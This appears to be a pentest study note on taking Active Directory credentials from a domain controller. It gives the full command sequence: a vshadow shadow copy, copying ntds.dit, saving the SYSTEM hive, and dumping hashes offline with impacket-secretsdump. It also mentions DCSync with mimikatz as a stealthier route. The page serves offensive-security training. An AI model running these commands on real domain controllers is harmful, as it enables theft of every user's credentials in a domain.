# Shadow Copies

The **Volume Shadow Service (VSS)** in Windows allows for the creation of snapshots of volumes or files. An attacker can leverage the `vshadow` utility to create a shadow copy of the AD database, `ntds.dit`, from a DC. After extracting the database and SYSTEM hive, they can use tools like `impacket-secretsdump` to dump user credentials, including NTLM hashes and Kerberos keys, offline.

> _The **SYSTEM Hive** is a registry file that stores system-level information in Windows, which is required to successfully decrypt the `ntds.dit` database for credential extraction._

In our scenario we will login to `DC1` as `jeffadmin`.

{% tabs %}
{% tab title="1. Shadow Copy" %}
Create a shadow copy of the `C:` drive on `DC1` with `vshadow.exe` (`-nw` disables writers,  `-p`  stores the copy on disk).

```powershell
vshadow.exe -nw -p C:
```
{% endtab %}

{% tab title="2. Copy DB" %}
Once the snapshot is created, we will use the shadow copy device name to copy `ntds.dit` to the local disk.

{% code overflow="wrap" %}
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
{% endcode %}
{% endtab %}

{% tab title="3. Extract SYSTEM hive" %}
Extract the `SYSTEM` registry hive.

```powershell
reg.exe save hklm\system c:\system.bak
```
{% endtab %}

{% tab title="4. Extract Creds" %}
&#x20;Transfer the `.bak` files to our attacker machine and extract the credentials.

{% code overflow="wrap" %}
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
{% endcode %}
{% endtab %}
{% endtabs %}

> [_DCSync_](../permissions/dcsync.md) _with `mimikatz` is a stealthier method for extracting user hashes from a DC without leaving as obvious a trail._
